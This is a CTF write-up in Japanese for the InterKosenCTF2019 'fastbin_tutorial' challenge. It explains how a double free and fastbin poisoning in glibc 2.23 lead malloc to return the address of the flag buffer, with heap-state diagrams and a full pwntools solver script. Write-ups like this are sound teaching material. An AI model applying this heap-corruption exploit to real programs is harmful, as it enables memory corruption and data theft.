---
title: "fastbin_tutorial - InterKosenCTF2019"
date: 2022-05-07T22:17:57+09:00
tags: ["pwn", "InterKosenCTF", "ptr-yudai's chall"]
draft: false
---

# 方針
[公式writeup](https://hackmd.io/@theoldmoon0602/Hkebii9iN)では、Use After Freeでやっているのですが、
`Double Free Tutorial!`と出てくるので、double freeとfastbin unlink attackをやります。

## 注意点
最初に与えられる`flag`のアドレスから`0x10`を引かなければならない。

```c
char *flag;
:
void setup(void)
{
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);
  FILE *f = fopen("flag.txt", "r");
  flag = malloc(0x50);
  if (f == NULL) {
    puts("[WARN] Please report this bug to the author.");
    exit(1);
  }
  fread(flag, 1, 0x50, f);
  fclose(f);
  malloc(0x100); // assure no leak by freed FILE buffer
}
```

与えられたアドレスに直接繋ぐと、`Oops! You forgot the overhead...?`と教えてくれる。
`flag`は、mallocで確保されているので、本来のチャンクより`+0x10`のアドレスが返ってきている。[malloc.c L1126](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L1126)

## fastbin に `addr_flag`を繋ぐ
あるチャンクに対して共有状態を作って、そのチャンクが返ってくるときに`addr_flag`が返ってくるようにします。

mallocしてあるチャンクをfreeします。
glibc-2.23だから`tcache`はないので、freeするとfastbinに繋がります。
### 事前準備
#### `A`をfree
```python
malloc("A")
malloc("B")
free("A")
```
```
fastbin: A -> NULL
```

#### `B`をfree
```
fastbin: B -> A -> NULL
```

#### double free `A`
ここで、既にfreeしてある`A`を再びfreeするので、double freeが起きます。
```
fastbin: A -> B -> A -> NULL
```

実体として、`fastbin`につながっている２つの`A`は同じものです。

### `A`の領域を確保してアドレスを書き込む
[![malloc_A](https://i.gyazo.com/019ace4843019b08d24c83fcd3cb9d97.png)](https://gyazo.com/019ace4843019b08d24c83fcd3cb9d97)

```
fastbin: B -> A -> NULL
```

mallocされた領域から見た`A`に`addr_flag`を書き込む（図の(1)）と、
fastbinに繋がっているchunkからは`fd`に書き込まれたように見える。

次のようになる。（図の(2)）
```
fastbin: B -> A -> addr_flag -> NULL
```

あとは、mallocを繰り返して、この`addr_flag`が返ってきた領域を`read`すればいい。

# [Solver](https://github.com/yu1hpa/ctf-writeup/tree/master/2019/InterKosenCTF/fastbin_tutorial)

```python
from pwn import *

file = "./chall"
context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process(file)

def malloc(s: str):
    io.sendlineafter("> ", "1")
    io.sendlineafter(": ", s)

def free(s: str):
    io.sendlineafter("> ", "2")
    io.sendlineafter(": ", s)

def read(s: str):
    io.sendlineafter("> ", "3")
    io.sendlineafter(": ", s)

def write(s: str, addr: hex):
    io.sendlineafter("> ", "4")
    io.sendlineafter(": ", s)
    io.sendlineafter("> ", addr)

io.recvuntil("located at ")
addr_flag = int(io.recvuntil(".").rstrip(b".\n"), 16)

malloc("A")
malloc("B")
free("A") # fastbin: A -> NULL
free("B") # fastbin: B -> A -> NULL
free("A") # fastbin: A -> B -> A -> NULL
malloc("A") # fastbin: B -> A -> NULL
write("A", p64(addr_flag - 0x10)) # fd(A) = addr_flag
# fastbin: B -> A -> addr_flag -> NULL
malloc("B") # fastbin: A -> addr_flag -> NULL
malloc("C") # fastbin: addr_flag -> NULL
malloc("A") # A = addr_flag
read("A") # read(addr_flag)


io.interactive()
```
